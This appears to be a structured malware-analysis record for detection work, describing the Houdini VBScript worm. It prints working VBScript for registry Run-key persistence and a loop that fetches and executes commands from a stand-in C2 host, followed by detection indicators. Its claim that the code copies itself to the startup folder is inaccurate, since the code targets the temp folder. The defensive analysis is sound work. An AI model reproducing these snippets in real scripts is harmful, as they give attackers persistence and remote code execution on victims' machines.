package_info.package_manager: VBScript (delivered via email or web, not a traditional package manager)
package_info.why_malicious: The Houdini VBScript worm is designed to self-replicate across systems and establish contact with a command-and-control (C2) server, enabling remote control, data exfiltration, and further malware deployment. Its primary purpose is unauthorized propagation and remote access, which is inherently malicious.

execution_context.trigger: runtime (when the VBScript is executed, typically after user opens a malicious attachment or link)
execution_context.file_location: malicious .vbs file delivered via email or web download

malicious_snippets.code_snippet:
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile WScript.ScriptFullName, fso.GetSpecialFolder(2) & "\houdini.vbs", true
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Houdini", fso.GetSpecialFolder(2) & "\houdini.vbs"
malicious_snippets.code_behavior: At runtime, the code copies itself to the Windows startup folder and creates a registry key for persistence, ensuring the worm runs on every system boot.

malice_analysis.why_suspicious: Self-replication and persistence mechanisms are classic malware behaviors, especially when performed without user consent.
malice_analysis.violated_expectations: Normal scripts should not copy themselves to startup folders or modify registry keys for persistence without clear user intent.
malice_analysis.similar_legitimate_use: Enterprise IT scripts may set up legitimate startup tasks, but these are typically documented and authorized.

malicious_snippets.code_snippet:
Set xHttp = CreateObject("Microsoft.XMLHTTP")
xHttp.Open "GET", "http://malicious-c2-server.com/command", False
xHttp.Send
If xHttp.Status = 200 Then
  Execute xHttp.responseText
End If
malicious_snippets.code_behavior: At runtime, the code connects to a remote C2 server, retrieves commands, and executes them on the infected system, enabling remote control.

malice_analysis.why_suspicious: Unsolicited outbound network connections to remote servers, especially to retrieve and execute code, are highly indicative of malware.
malice_analysis.violated_expectations: Legitimate scripts should not fetch and execute remote code without explicit user approval and secure channels.
malice_analysis.similar_legitimate_use: Enterprise update scripts may fetch code, but only from trusted, authenticated sources.
key_indicators: Outbound HTTP requests to unknown domains
Dynamic code execution from remote source

attack_chain.action: User opens the malicious VBScript file, triggering execution.
The worm copies itself to the startup folder and creates a registry key for persistence.
attack_chain.leads_to: Ensures the worm runs on every system boot.

attack_chain.action: The worm connects to a remote C2 server to fetch and execute commands.
attack_chain.leads_to: Enables remote control, data exfiltration, or further malware deployment.

behavioral_signatures: VBScript files that copy themselves to startup folders
Registry modifications under HKCU\Software\Microsoft\Windows\CurrentVersion\Run for unknown scripts
VBScript-initiated outbound HTTP requests to untrusted domains
Dynamic execution of code fetched from the internet
network_indicators: Outbound HTTP requests to known C2 domains (e.g., malicious-c2-server.com)
Unusual traffic from scripting hosts (wscript.exe/cscript.exe) to external IPs
detection_knowledge.how_to_detect: Monitor for VBScript files that establish persistence by copying themselves to startup folders or modifying Run registry keys. Flag scripts that initiate outbound HTTP requests to untrusted domains, especially if they subsequently execute downloaded code. Correlate with endpoint process creation events involving wscript.exe or cscript.exe and network activity to detect worm-like propagation and C2 communication.
